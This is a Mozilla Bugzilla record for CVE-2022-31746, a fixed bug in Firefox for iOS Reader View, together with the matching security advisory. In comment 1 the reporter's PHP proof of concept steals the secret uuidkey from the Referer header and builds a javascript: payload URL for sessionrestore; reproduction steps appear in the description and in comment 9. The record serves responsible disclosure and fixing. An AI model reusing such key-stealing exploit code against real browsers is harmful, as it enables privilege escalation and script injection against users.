=== Content from bugzilla.mozilla.org_948c37c7_20250108_111007.html ===


![](/static/v20241211.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1654416)
* [XML](/show_bug.cgi?ctype=xml&id=1654416)

Closed
[Bug 1654416](/show_bug.cgi?id=1654416)
(CVE-2022-31746)

Opened 4 years ago
Closed 3 years ago

# Bypass privileged internal: URL protetion through referrer

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Bypass privileged internal: URL protetion through referrer

## Categories

### (Firefox for iOS :: Reader View, defect, P3)

[Product:](/describecomponents.cgi?product=Firefox%20for%20iOS)

Firefox for iOS
▾

Firefox for iOS
Firefox for iOS is the Firefox mobile experience developed for the iOS platform.
[See Open Bugs in This Product](/buglist.cgi?product=Firefox%20for%20iOS&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox%20for%20iOS)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox%20for%20iOS&component=Reader%20View#Reader%20View)

Reader View
▾

Firefox for iOS :: Reader View
Issues with readability and reader view.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox%20for%20iOS&component=Reader%20View&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox%20for%20iOS&component=Reader%20View&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox%20for%20iOS&component=Reader%20View)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Other

iOS

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P3

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S3

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Score | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| fxios | [102](/buglist.cgi?f1=cf_tracking_fxios&o1=equals&v1=102) | --- |

|  | Tracking | Status |
| --- | --- | --- |
| fxios | 102 |  |

## People

### (Reporter: sdna.muneaki.nishimura, Unassigned)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

*Unassigned*

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/7e8b2996acb6304c9b7b7000f408632a?d=mm&size=40)  [sdna.muneaki.nishimura](/user_profile?user_id=507051)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/481f85b35d45ebad6d41f98cae68ccbf?d=mm&size=40)  [jeevans](/user_profile?user_id=654438)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

11 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1290732](/show_bug.cgi?id=1290732 "RESOLVED FIXED - Reader-mode leaks HTTPS URL through referer header")

[mozilla-hub.atlassian.net/browse/FXIO...](https://mozilla-hub.atlassian.net/browse/FXIOS-3577 "https://mozilla-hub.atlassian.net/browse/FXIOS-3577")

[github.com/mozilla-mobile/firefox-ios...](https://github.com/mozilla-mobile/firefox-ios/pull/10855 "https://github.com/mozilla-mobile/firefox-ios/pull/10855")

## Details

### (4 keywords)

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2022-31746

[Keywords:](/describekeywords.cgi)

[csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

---

QA Whiteboard:

---

Has STR:

---

Change Request:

---

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a61067222_1689 "4 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | sec-bounty-hof |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files)

| [Demonstrate uuidkey stealing attack](/attachment.cgi?id=9165250)  [4 years ago](#c0)  [Muneaki Nishimura](/user_profile?user_id=507051)   1.56 MB, video/mp4 |  | [Details](/attachment.cgi?id=9165250&action=edit) |
| --- | --- | --- |
| [Exploit on iPhone 8 - iOS 13.7.mp4](/attachment.cgi?id=9268267)  [3 years ago](#c10)  [lmarceau](/user_profile?user_id=694570)   1.60 MB, video/mp4 |  | [Details](/attachment.cgi?id=9268267&action=edit) |
| [advisory.txt](/attachment.cgi?id=9282587)  [3 years ago](#c15)  [lmarceau](/user_profile?user_id=694570)   152 bytes, text/plain |  | [Details](/attachment.cgi?id=9282587&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Muneaki Nishimura](/user_profile?user_id=507051)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1654416#c0)• 4 years ago |
|  | |

Attached video
[Demonstrate uuidkey stealing attack](attachment.cgi?id=9165250)
— [Details](attachment.cgi?id=9165250&action=edit)

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_14\_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15

Steps to reproduce:

In [Bug 1263627](/show_bug.cgi?id=1263627 "RESOLVED FIXED - It should not be possible to manually navigate to internal URLs"), secret key based privileged URLs protection was implemented for internal:// schemes.

If protection is bypassed, untrusted web content can still abuse a XSS bug in about/sessionrestore ([Bug 1258188](/show_bug.cgi?id=1258188 "RESOLVED FIXED - XSS in the 'history' parameter of about/sessionrestore")) and also still can get any cross origin web contents ([Bug 1279787](/show_bug.cgi?id=1279787 "RESOLVED FIXED - Stealing cross origin DOM data with bypassing localhost navigation restriction")).

The bypass technique I found is below.

(1) Open Safari and visit <http://csrf.jp/2020/uuidkey_stealer_entry.html>

(2) Tap a firefox:// link in the page to launch exploit in ReaderView on Firefox for iOS.

Note that this step is not mandatory, just a shortcut for easier reproduction.

(3) ReaderView frame is shown in Firefox for iOS, and wait for few seconds

(4) Tap "Load original page" in ReaderView

(5) Exploitation code at <http://csrf.jp/2020/uuidkey_stealer.php> is shown.

Then secret key (uuidkey) is leaked through REFERER header

(6) Tap "Exploit Link", alert() by XSS is shown in internal://local (see attached video for demonstration)

Actual results:

As explaind at (5), secret key (uuidkey) is leaked to web page through REFERER header.

By using the key, untrusted web contents can abuse existing XSS bug on sessionrestore ([Bug 1258188](/show_bug.cgi?id=1258188 "RESOLVED FIXED - XSS in the 'history' parameter of about/sessionrestore")).

Expected results:

Set <meta name="referrer" content="never"> in ReaderViewLoading.html .

<https://github.com/mozilla-mobile/firefox-ios/blob/76faae8c6c94e22c8fbc0de72e2d06f615738e2c/Client/Frontend/Reader/ReaderViewLoading.html#L7>

That can stop the REFERER leakage.

The other HTML template `Reader.html` already has the same protection. Do the same thing.

<https://github.com/mozilla-mobile/firefox-ios/blob/76faae8c6c94e22c8fbc0de72e2d06f615738e2c/Client/Frontend/Reader/Reader.html#L10>

|  | [Muneaki Nishimura](/user_profile?user_id=507051)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1654416#c1)• 4 years ago |
|  | |

Exploitation code that stealed uuidkey at (5) is below.

```
<?php
$keyname = 'uuidkey=';
if(isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], $keyname)) {
    // Steal uuidkey
    $referer = $_SERVER['HTTP_REFERER'];
    $pos = strpos($referer, $keyname) + strlen($keyname);
    $uuidkey = substr($referer, $pos);
    $exploiturl = 'internal://local/sessionrestore?history=%7B%22history%22%3A%5B%22javascript%3Aalert%28document.location%29%22%5D%2C%22currentPage%22%3A-1%7D' . '&' . $keyname . $uuidkey;

    echo '<b>Referer:</b><br>' . $referer . '<br><br>';
    echo '<b>uuidkey:</b><br>' . $uuidkey . '<br><br>';
    echo '<hr>';
    echo '<b>Exploit Link: </b><br><a href="' . $exploiturl . '">' . $exploiturl . '</a>';
} else {
	// Send dummy response that leads error on reader-view
    header('Content-Type: application/pdf');
}
?>

```

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a3931_1689)• 4 years ago |

Flags: sec-bounty?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a149892_1689)• 4 years ago |

Keywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)See Also: → [1290732](/show_bug.cgi?id=1290732 "RESOLVED FIXED - Reader-mode leaks HTTPS URL through referer header")

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1654416#c2)• 4 years ago |
|  | |

The severity field is not set for this bug.

:garvan, could you have a look please?

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#workflow.2Fno_severity.py).

Flags: needinfo?(gkeeley)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1654416#c3)• 4 years ago |
|  | |

Garvan, can you take a look? It seems serious enough to increase priority here.

|  | [Muneaki Nishimura](/user_profile?user_id=507051)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1654416#c4)• 4 years ago |
|  | |

Do you have a plan to fix this vulnerability?

If not, please disclose this ticket because other browsers who use FxiOS can take action by themselves based on this information.

Flags: needinfo?(garvankeeley+github)Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1654416#c5)• 4 years ago |
|  | |

[Moving needinfo to dbolter since Garvan left.]

Muneaki: Mozilla is officially closed until January 4 so you won't get an answer until then at the earliest.

Flags: needinfo?(gkeeley)Flags: needinfo?(garvankeeley+github)Flags: needinfo?(dveditz)Flags: needinfo?(dbolter)

|  | [David Bolter [:davidb] (NeedInfo me for attention)](/user_profile?user_id=152868) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a15358947_152868)• 4 years ago |

Flags: needinfo?(jeevans)Flags: needinfo?(jboek)Flags: needinfo?(dbolter)

|  | [Muneaki Nishimura](/user_profile?user_id=507051)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1654416#c6)• 4 years ago |
|  | |

Can I get your decision on this?

Flags: needinfo?(dbolter)

|  | [David Bolter [:davidb] (NeedInfo me for attention)](/user_profile?user_id=152868) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a44745257_152868)• 3 years ago |

Flags: needinfo?(dbolter) → needinfo?(sarentz)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1654416#c7)• 3 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1654416&comment_id=15717436 "1 revision") |
|  | |

I have forwarded this to the Firefox iOS team through email and I've removed myself from this bug.

Flags: needinfo?(sarentz)

|  | [Jeremy Evans](/user_profile?user_id=654438) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a45935976_654438)• 3 years ago |

Flags: needinfo?(jeevans)

|  | [Nishant Bhasin](/user_profile?user_id=651766) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1654416#c8)• 3 years ago |
|  | |

Hi, tapping on the link from Safari to Firefox I do not see a reader view frame and all I see is a blank page.

Is there a step I need to perform after opening the link?

|  | [Muneaki Nishimura](/user_profile?user_id=507051)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1654416#c9)• 3 years ago |
|  | |

During the past two years, the attack path from Safari has been blocked because there is no longer a way to go directly from Safari to the about: scheme URL. Also, the default referrer policy of WKWebView has been changed in iOS 15, so this exploit is no longer working. However, you can still reproduce this attack.

(1) Copy the URL to the clipboard: about:reader?url=<https://csrf.jp/2020/uuidkey_stealer.php>

(2) Open Firefox on an iOS 14.X device

(3) Long-tap the address bar, and go to the page through "Paste & Go"

(4) Tap "Load original page" in the ReaderView

|  | [lmarceau](/user_profile?user_id=694570) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1654416#c10)• 3 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1654416&comment_id=15817828 "1 revision") |
|  | |

Attached video
[Exploit on iPhone 8 - iOS 13.7.mp4](attachment.cgi?id=9268267)
— [Details](attachment.cgi?id=9268267&action=edit)

Hello! I tried reproducing and got the issue on iOS 13.7. I see the exploitation code and exploit link as originally described. On iOS 15.2 I got a blank page after clicking on "Load original page". So it seems we need to investigate since this is still an issue on older OS.

Also, progress on this issue is tracked as well in JIRA with: <https://mozilla-hub.atlassian.net/browse/FXIOS-3577>

|  | [lmarceau](/user_profile?user_id=694570) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a53275056_694570)• 3 years ago |

Severity: -- → S3

|  | [lmarceau](/user_profile?user_id=694570) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a54484150_694570)• 3 years ago |

Priority: -- → P3

|  | [Simon Basca [:SimonB]](/user_profile?user_id=567579) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1654416#c11)• 3 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1654416&comment_id=15929173 "1 revision") |
|  | |

I was able to reproduce the issue on iPhone SE (14.8) on Firefox 9000 (9809).

Note: The issue is not reproducible on latest iOS 15.4

|  | [Simon Basca [:SimonB]](/user_profile?user_id=567579) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1654416#c12)• 3 years ago |
|  | |

We were unable to reproduce this issue on the latest main v9000 (10270) on iPhone SE (14.8) and iPhone 13 (13.7).

This issue was reproducible on the same devices on an older version of main v9000 (9809).

@Laurie @Nishant should we close this issue as well?

Flags: needinfo?(lmarceau)

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1654416#c13)• 3 years ago |
|  | |

Redirect a needinfo that is pending on an inactive user to the triage owner.

:jeevans, since the bug has recent activity, could you have a look please?

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#inactive_ni_pending.py).

Flags: needinfo?(jboek) → needinfo?(jeevans)

|  | [yoana](/user_profile?user_id=700900) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a60014668_700900)• 3 years ago |

[tracking-fxios](/buglist.cgi?f1=cf_tracking_fxios&o1=isnotempty):
--- → [102](/buglist.cgi?f1=cf_tracking_fxios&o1=equals&v1=102)

|  | [lmarceau](/user_profile?user_id=694570) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1654416#c14)• 3 years ago |
|  | |

Closing issue, PR was: <https://github.com/mozilla-mobile/firefox-ios/pull/10855>

Status: NEW → RESOLVEDClosed: 3 years agoFlags: needinfo?(lmarceau)Flags: needinfo?(jeevans)Resolution: --- → FIXED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a60548090_75935)• 3 years ago |

Group: mobile-core-security → core-security-release

|  | [lmarceau](/user_profile?user_id=694570) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1654416#c15)• 3 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9282587)
— [Details](attachment.cgi?id=9282587&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a60623623_578488)• 3 years ago |

Alias: CVE-2022-31746

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a61067222_1689)• 3 years ago |

Flags: sec-bounty? → sec-bounty+See Also: → <https://mozilla-hub.atlassian.net/browse/FXIOS-3577>,
<https://github.com/mozilla-mobile/firefox-ios/pull/10855>

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a121714829_5898)• 7 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1654416#a131094876_1689)• 4 months ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1654416&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Muneaki Nishimura](/user_profile?user_id=507051)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_40072003_20250108_111007.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    #### Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    #### Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    #### Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    #### Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [#### Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    #### Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    #### Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    #### Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    #### Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    #### MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    #### Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    #### Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [#### About Mozilla](/en-US/about/)
  + [#### The Mozilla Manifesto](/en-US/about/manifesto/)
  + [#### Get Involved](/en-US/contribute/)
  + [#### Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [#### Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [#### Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [#### Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [#### Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [#### Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2022-27

## Security Vulnerabilities fixed in Firefox for iOS 102

Announced
June 29, 2022
Impact
moderate
Products
Firefox for iOS
Fixed in

* Firefox for iOS 102

#### [#CVE-2022-31746: Privileged internal URL protection could be bypassed through referrer header.](#CVE-2022-31746)

Reporter
Muneaki Nishimura
Impact
moderate
##### Description

Internal URLs are protected by a secret UUID key, which could have been leaked to web page through the Referrer header.

##### References

* [Bug 1654416](https://bugzilla.mozilla.org/show_bug.cgi?id=1654416)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


